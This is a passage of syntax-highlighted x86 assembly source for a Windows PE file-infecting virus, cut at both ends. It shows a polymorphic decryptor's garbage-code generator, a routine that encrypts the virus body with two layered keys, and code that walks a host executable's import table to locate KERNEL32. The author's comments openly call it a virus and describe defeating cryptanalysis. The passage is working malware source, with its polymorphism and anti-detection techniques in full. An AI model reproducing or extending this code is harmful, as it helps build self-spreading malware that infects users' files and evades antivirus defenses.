                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0738h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomFlags</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@TwoBytes_01</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
      </span><span class="sc5">@@TwoBytes_01</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">

      </span><span class="sc5">@@EndGarbage</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">S_EDI</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">popad</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">ModifyDumbDecryptor</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">KeyModification</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">KeyModifier</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">EncryptType2</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">Addr_Kernel32</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">; Address of KERNEL32</span><span class="sc0">

</span><span class="sc1">;; This routine copies dword by dword the indicated frame, and before storing</span><span class="sc0">
</span><span class="sc1">;; it, it encrypts that dword with the encryption key. There is one control</span><span class="sc0">
</span><span class="sc1">;; variable (CopyingVirus) that controls whether he have to leave the first</span><span class="sc0">
</span><span class="sc1">;; 3Ch bytes unencrypted (the little decryptor) and we have to encrypt with</span><span class="sc0">
</span><span class="sc1">;; two encryption keys instead of one. Cryptanalisys is hard with two decryp-</span><span class="sc0">
</span><span class="sc1">;; tion keys because the relation from one byte to another doesn't remain</span><span class="sc0">
</span><span class="sc1">;; constant when you apply XOR+XOR or ADD+XOR or SUB+XOR, as I apply in this</span><span class="sc0">
</span><span class="sc1">;; virus. If this doesn't avoid anything, maybe next time I'll code two 8 Kb</span><span class="sc0">
</span><span class="sc1">;; sized decryptors with the TUAREG and with more techniques of encryption (or</span><span class="sc0">
</span><span class="sc1">;; two encryptions, or position-based decryptions, or things like that :).</span><span class="sc0">
</span><span class="sc5">EncryptWhileStoring</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CopyingVirus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc1">; Virus code?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Jump_000</span><span class="sc0">      </span><span class="sc1">; If not, jump</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Ch</span><span class="sc4">/</span><span class="sc2">4</span><span class="sc0">    </span><span class="sc1">; Leave the first 3Ch bytes with only</span><span class="sc0">
                                      </span><span class="sc1">; an encryption layer</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Loop_001</span><span class="sc0">
    </span><span class="sc5">@@Jump_000</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">      </span><span class="sc1">; EDX=0</span><span class="sc0">
    </span><span class="sc5">@@Loop_001</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">lodsd</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CopyingVirus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Next2</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">   </span><span class="sc1">; While EDX isn't 0, we only encrypt with</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Next1</span><span class="sc0">      </span><span class="sc1">; the main encryption key</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Next2</span><span class="sc0">
      </span><span class="sc5">@@Next1</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">EncryptType2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@ADD2</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@SUB2</span><span class="sc0">
        </span><span class="sc5">@@XOR2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CryptValue2</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Next3</span><span class="sc0">
        </span><span class="sc5">@@ADD2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CryptValue2</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Next3</span><span class="sc0">
        </span><span class="sc5">@@SUB2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CryptValue2</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc5">@@Next3</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CryptValue2</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">KeyModification</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@ModADD</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@ModSUB</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">KeyModification</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@ModXOR</span><span class="sc0">
      </span><span class="sc5">@@ModROL</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Next4</span><span class="sc0">
      </span><span class="sc5">@@ModADD</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">KeyModifier</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Next4</span><span class="sc0">
      </span><span class="sc5">@@ModSUB</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">KeyModifier</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Next4</span><span class="sc0">
      </span><span class="sc5">@@ModXOR</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">KeyModifier</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc5">@@Next4</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CryptValue2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc5">@@Next2</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">cmp</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">EncryptType</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">@@ADD</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">@@SUB</span><span class="sc0">
      </span><span class="sc5">@@XOR</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">xor</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DecryptKey</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@@Next</span><span class="sc0">
      </span><span class="sc5">@@ADD</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">add</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DecryptKey</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@@Next</span><span class="sc0">
      </span><span class="sc5">@@SUB</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">sub</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DecryptKey</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc5">@@Next</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Loop_001</span><span class="sc0"> </span><span class="sc1">; Repeat &lt;ECX&gt; times (I don't use LOOP coz</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">      </span><span class="sc1">; the jump exceeds 128 bytes :)</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">EncryptWhileStoring</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">CopyingVirus</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">EncryptType</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">; 0=ADD, 1=SUB, 2=XOR</span><span class="sc0">
</span><span class="sc5">DecryptKey</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">CalculateAPIsAddresses</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc1">;; ESI=Address of PE header</span><span class="sc0">
                </span><span class="sc6">pushad</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">APIInfo</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
     </span><span class="sc5">@@LoopKK</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">  </span><span class="sc5">@@LoopKK</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">AnyAPIFound</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">06h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc5">@@Loop01</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@NextSection</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@SectionFound</span><span class="sc0">
     </span><span class="sc5">@@NextSection</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">28h</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Loop01</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Exit</span><span class="sc0">
    </span><span class="sc5">@@SectionFound</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc1">;; EAX=Physical address of import table (relative)</span><span class="sc0">
                </span><span class="sc1">;; EDI=Virtual address of import table (relative)</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Idata_Phys</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Idata_Virt</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">84h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MappingAddress</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
     </span><span class="sc5">@@Loop02</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Exit</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">50h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">    </span><span class="sc5">@@Next</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Idata_Virt</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Idata_Phys</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MappingAddress</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ToLower</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'nrek'</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Next2</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ToLower</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'23le'</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Next2</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ToLower</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'lld.'</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Next2</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">34h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Idata_Virt</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Idata_Phys</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MappingAddress</span><span class="sc4">]</span><span class="sc0">

       </span><span class="sc5">@@Otro</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">js</span><span class="sc0">    </span><span class="sc5">@@NextFunc</span><span class="sc0">      </span><span class="sc1">; Avoid ordinals</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Exit</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Idata_Virt</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Idata_Phys</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MappingAddress</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc5">@@LoopAPI</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@NameCalculated</span><span class="sc0">
